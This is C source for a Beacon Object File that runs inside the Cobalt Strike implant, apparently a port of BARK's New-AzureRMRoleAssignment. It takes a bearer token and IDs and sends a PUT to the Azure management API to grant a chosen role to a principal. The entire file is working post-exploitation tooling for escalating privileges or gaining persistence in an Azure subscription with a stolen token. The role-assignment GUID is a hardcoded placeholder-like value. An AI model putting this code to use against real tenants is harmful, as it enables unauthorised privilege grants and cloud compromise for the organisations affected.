/*
 * new_azurerm_role_assignment.c — BARK BOF
 * New-AzureRMRoleAssignment — Grant an Azure RM role to a principal
 *
 * Args : token, principalId, azureRMRoleId, subscriptionId
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    char   pathBuf[1024], bodyBuf[1024];
    LPWSTR widePath = NULL;
    char  *token = NULL, *principalId = NULL, *roleId = NULL, *subId = NULL;

    BeaconDataParse(&parser, args, alen);
    token       = BeaconDataExtract(&parser, NULL);
    principalId = BeaconDataExtract(&parser, NULL);
    roleId      = BeaconDataExtract(&parser, NULL);
    subId       = BeaconDataExtract(&parser, NULL);

    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Usage: bark_new_azurerm_role_assignment "
            "<token> <principalId> <roleId> <subscriptionId>\n");
        return;
    }
    MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf),
        "{\"properties\":{\"roleDefinitionId\":\"%s\",\"principalId\":\"%s\"}}",
        roleId, principalId);
    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
        "/subscriptions/%s/providers/Microsoft.Authorization/roleAssignments/"
        "a1b2c3d4-e5f6-7890-abcd-ef1234567890?api-version=2018-01-01-preview",
        subId);
    widePath = MbsToWcs(pathBuf);
    if (!widePath) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }
    BeaconPrintf(CALLBACK_OUTPUT, "[*] New-AzureRMRoleAssignment\n");
    BarkPost(L"management.azure.com", widePath, L"PUT", bodyBuf, token, "application/json");
    HFree(widePath);
}
